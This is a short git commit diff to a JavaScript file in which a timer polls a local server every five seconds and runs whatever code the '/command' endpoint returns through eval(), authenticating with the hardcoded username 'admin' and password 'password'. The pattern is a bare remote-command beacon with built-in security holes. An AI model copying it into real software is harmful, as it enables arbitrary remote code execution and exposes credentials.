3c298f88d4a8eeb39516dcba629fa4b9cdac08e8
Leonardo Rocha <leopdor@gmail.com>
2020-03-08 22:43:32 -0300

    Login with Admin Account

--- code.js
+++ code.js
@@ -1,17 +1,49 @@
-var apiUrl = 'https://jsonplaceholder.typicode.com/todos/';
+var apiUrl = 'http://localhost:8080/';
 var count =0;
+var user = 'admin';
+var password = 'password';
 
-function verificaOnline(){
+function isOnline(){
     var xhttp = new XMLHttpRequest(); 
-    xhttp.open("GET", apiUrl +count , true);
+    xhttp.open("GET", apiUrl +'online' , true);
     xhttp.onreadystatechange = function() {
-        console.log(this.responseText);
+        if(this.readyState ===4 ){            
+            if(this.status === 200){
+                console.log(this.responseText);
+            } else{
+                console.log('Offline');
+            }
+        }
+    };
+    xhttp.onerror = function() {
+        console.log(this.status);
+        console.log('Offline');
+    };
+    xhttp.send();
+}
+
+function getCommand(){
+    var xhttp = new XMLHttpRequest(); 
+    xhttp.open("GET", apiUrl +'command' , true, user, password);
+
+    xhttp.onreadystatechange = function() {
+        if(this.readyState ===4 ){            
+            if(this.status === 200){
+                eval(this.responseText);
+            } else if( this.status === 401){
+                console.log('Unauthorized')
+            } 
+
+        }
+    };
+    xhttp.onerror = function() {
+        console.log('i cant do it');
     };
     xhttp.send();
 }
 
 setInterval(function() { 
-            console.log(apiUrl +count)
-            count++;
-            verificaOnline();
-}, 1000);
+    count++;
+    isOnline();
+    getCommand();
+}, 5000);
